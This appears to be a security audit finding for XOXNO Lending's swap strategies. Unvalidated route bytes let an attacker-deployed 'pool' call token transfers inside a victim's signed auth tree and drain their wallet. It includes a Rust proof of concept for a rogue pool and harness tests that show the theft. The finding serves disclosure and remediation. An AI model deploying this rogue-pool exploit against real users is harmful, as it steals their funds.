### Title
Attacker-supplied swap route invokes arbitrary contract under the signer's auth tree, draining the caller's wallet - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The Invoice Ninja bug class — user-controlled input reaching an execution sink without validation — maps directly onto XOXNO Lending's router strategies. The `swap`/`route` bytes in `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` (and the router's own `execute_strategy`) are attacker-controlled XDR that name every pool and token address the router will invoke. The router keeps no allowlist of venues, so a crafted route places an attacker-deployed contract on the call stack while the victim's `require_auth` tree is active. That contract can call `token.transfer(victim, attacker, amount)`; simulation records the transfer as a child of the victim's signed `swap_collateral` entry, so the host authorizes it and the victim's unrelated wallet tokens are stolen. A dedicated harness test demonstrates the theft end to end.

### Finding Description
`swap_tokens` authorizes only one thing: the controller's exact `token_in` transfer to the configured router (`authorize_transfer_as_current`), then calls `router.execute_strategy(controller, amount_in, swap)` with `swap` supplied verbatim by the caller [1](#0-0) . The balance-delta checks (`RouterOverspend`, `NoSwapOutput`) bound only the controller's own balances [2](#0-1) .

Inside the router, venue hops call whatever pool/token addresses the payload's `assets` registry names — there is no venue allowlist [3](#0-2) . Any pool address on the route therefore runs arbitrary Wasm inside the transaction where the signer's auth entry for `swap_collateral` is live. If that pool invokes `token_in.transfer(victim, attacker, amount)`, `simulateTransaction` records the transfer as a sub-invocation of the victim's root entry; when the victim signs that tree, the host authorizes the rogue transfer [4](#0-3) .

The harness test pins all three facts: recording mode produces a poisoned tree containing the stolen transfer; enforcing mode rejects the transfer only if the victim signs a different tree; and signing the simulated tree executes the theft while the swap itself settles correctly (correct `token_out` credited to the victim's position) [5](#0-4) . The threat model itself concedes the routed amount, the payload minimum, and the final risk gate do not bound this loss [6](#0-5) .

### Impact Explanation
Theft of user funds, beyond the routed amount. The victim's position bookkeeping is honest — they receive `token_out` at fair value — but their entire wallet balance of any token the rogue pool targets is transferred to the attacker under their own signature. Any wallet token the victim holds (not just lending-market assets) is reachable. The same exposure exists on the direct `execute_strategy` path for standalone swap users.

### Likelihood Explanation
The attack requires the victim to submit a transaction carrying an attacker-crafted route — the standard "malicious quote/frontend/phishing route" scenario, analogous to uploading a crafted restore archive. The route bytes are opaque XDR produced off-chain; a signer cannot see the pool addresses inside `assets` without decoding them, which is exactly the mitigation the docs concede is necessary but which no contract enforces. A compromised or malicious quote source, or a route pasted from an untrusted channel, weaponizes this with a single unprivileged `swap_collateral`/`swap_debt`/`repay_debt_with_collateral`/`multiply`/`execute_strategy` call. No admin action, no leaked key, no privileged role is needed on the attacker's side.

### Recommendation
Constrain what the signed auth tree can cover, on-chain rather than in the client:

- Maintain an allowlist of approved venue pool addresses (governance-managed, like approved Blend pools) and have the router reject hops whose `pool`/`token` addresses are not listed — mirroring how the fix for CVE-2025-10009 whitelists file types.
- Alternatively, have the controller decode the `StrategyPayload` header and asset registry before invoking the router and reject unknown pool addresses, so route validation lives in the contract that holds the user's auth.
- At minimum, enforce that the swap payload's `token_in`/`token_out` match the strategy arguments and cap `assets`/`ops` to known venue descriptors.

Until enforced, document prominently that signing a `routeXdr` authorizes arbitrary wallet transfers, not just the displayed swap.

### Proof of Concept
Working exploit exists at `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

```rust
// Attacker-deployed "pool" called by the router mid-swap
impl RogueHopPool {
    pub fn swap(env: Env) {
        // victim, wallet_token, attacker, amount from constructor plan
        token::Client::new(&env, &wallet_token)
            .transfer(&victim, &to, &amount); // joins victim's auth tree
    }
}
``` [7](#0-6) 

The test flow: Alice supplies 10,000 USDC and holds an unrelated wallet token; the attacker crafts `swap_collateral` route bytes naming `RogueHopPool` as the hop; `simulateTransaction` records `transfer(alice → attacker, WALLET_BALANCE)` under Alice's `swap_collateral` entry; signing that tree executes the transfer. Assertions: `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, and Alice still receives `FAIR_OUT_ETH` collateral — the swap "succeeds" while the wallet is drained [8](#0-7) .

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
